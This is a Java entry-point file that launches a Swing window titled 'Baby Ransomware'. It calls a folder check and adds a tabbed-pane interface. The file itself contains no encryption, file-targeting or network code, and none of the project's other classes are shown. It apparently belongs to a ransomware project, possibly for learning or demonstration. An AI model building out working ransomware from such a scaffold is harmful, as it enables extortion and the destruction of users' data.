import java.awt.BorderLayout;
import javax.swing.JFrame;
import ui.TabbedPaneWindow;
import util.Constants;

public class App {
    public static void main(String[] args) throws Exception {
        Constants.checkFolder();

        JFrame frame = new JFrame("Baby Ransomware");
        frame.setBounds(100, 50, 550, 400);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLocationRelativeTo(null);
        frame.getContentPane().add(new TabbedPaneWindow(), BorderLayout.CENTER);

    }
}
